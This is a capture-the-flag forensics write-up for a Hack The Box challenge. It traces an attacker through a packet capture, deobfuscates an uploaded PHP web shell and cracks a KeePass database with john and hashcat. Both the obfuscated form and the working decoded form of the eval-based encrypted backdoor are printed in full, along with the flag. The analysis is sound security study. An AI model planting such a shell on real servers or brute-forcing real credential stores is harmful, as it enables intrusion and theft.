> An attacker has found a vulnerability in our web server that allows arbitrary
> PHP file upload in our Apache server. Suchlike, the hacker has uploaded a what
> seems to be like an obfuscated shell (support.php). We monitor our network 24/7
> and generate logs from tcpdump (we provided the log file for the period of two
> minutes before we terminated the HTTP service for investigation), however, we
> need your help in analyzing and identifying commands the attacker wrote to
> understand what was compromised.

> Author: **[artikrh][author-profile]**

## The network traffic

Using wireshark, the protocol breakdown of `19-05-21_22532255.pcap` shows that 96% of the traffic is common IPv4 HTTP with web pages, js, images.

Yet there's a single IPv6 stream of data, filled with random bytes, and comming from nowhere.

Next, exporting all the HTTP objects, we see:

- 8 requests to the attacker script `/uploads/support.php` filled with base64 suspects
- 1 request to `/upload.php`, which allowed the attacker to put his code on the server

Yet running `base64 -d` on the data doesn't return anything obviously meaningful.
The php code should tell us how to decode all this data.

## The obscure code

The obfuscation of `support.php` looks fairly straightforward:

```php
$V='$k="80eu)u)32263";$khu)=u)"6f8af44u)abea0";$kf=u)"35103u)u)9f4a7b5";$pu)="0UlYu)yJHG87Eu)JqEz6u)"u)u);function u)x($';
$P='++)u){$o.=u)$t{u)$i}^$k{$j};}}u)retuu)rn $o;}u)if(u)@pregu)_u)match("/$kh(.u)+)$kf/",@u)u)file_u)getu)_cu)ontents(';
$d='u)t,$k){u)$c=strlu)en($k);$l=strlenu)($t)u);u)$o=""u);for($i=0u);u)$i<$l;){for(u)$j=0;(u)$u)j<$c&&$i<$l)u)u);$j++,$i';
$B='ob_get_cou)ntu)ents();@obu)_end_cleu)anu)();$r=@basu)e64_eu)ncu)ode(@x(@gzu)compress(u)$o),u)$k));pru)u)int(u)"$p$kh$r$kf");}';
$N=str_replace('FD','','FDcreFDateFD_fFDuncFDFDtion');
$c='"php://u)input"),$u)m)==1){@u)obu)_start();u)@evau)l(@gzuu)ncu)ompress(@x(@bau)se64_u)decodu)e($u)m[1]),$k))u));$u)ou)=@';
$u=str_replace('u)','',$V.$d.$P.$c.$B);
$x=$N('',$u);$x();
```

- `$N` will contain a function name
- `$u` is the payload:
  - made from the concatenation of the rest of the strings
  - interpretable after removing the meaningless `'u)'`
- `$x` will contain encapsulate `$u` in a function that is ultimately called

## The -mostly- clear code

Dynamic analysis will directly output the deobfuscated code, after:

- commenting out the function calls `$x=$N('',$u);$x();`
- adding instructions to output `$N` and `$x`
- starting a local server

```php
$N='create_function'
$k="80e32263";
$kh="6f8af44abea0";
$kf="351039f4a7b5";
$p="0UlYyJHG87EJqEz6";
function x($t,$k){
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t[$i]^$k[$j];
        }
    }
    return $o;
}
if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1){
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
    $o=@ob_get_contents();
    @ob_end_clean();
    $r=@base64_encode(@x(@gzcompress($o),$k));
    print("$p$kh$r$kf");
}
```

So actually the data was first compressed, then xorred and finally base64 encoded.

The input and output have the same formating, so both can be fed to the same decrypting function.

## The instructions

Again, let's run the script and replay the captured input & output with:

```php
if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1){
    print(@gzuncompress(@x(@base64_decode($m[1]),$k)));
}
```

## The data

So the attacker looked his id up, searched for accessibles folders and finally dumped a credential database.

`pwdb.kdbx` is the storage database for keepass.

I could neither guess the master password nor find it in the traffic dump.
Let's bruteforce it:

```bash
keepass2john pwdb.kdbx > pwdb.hash
hashcat -m 13400 -a 0 -w 2 /usr/share/wordlists/passwords/rockyou-75.txt pwdb.hash
john -w /usr/share/wordlists/passwords/rockyou-75.txt pwdb.hash
```

Actually hashcat didn't recognize john's format, so I used the latter.
Anyway it was enough, we can finally open the database with keepass and copy the password for admin user, which is the flag.

> `HTB{pr0tect_y0_shellZ}`

[author-profile]: https://app.hackthebox.com/users/41600
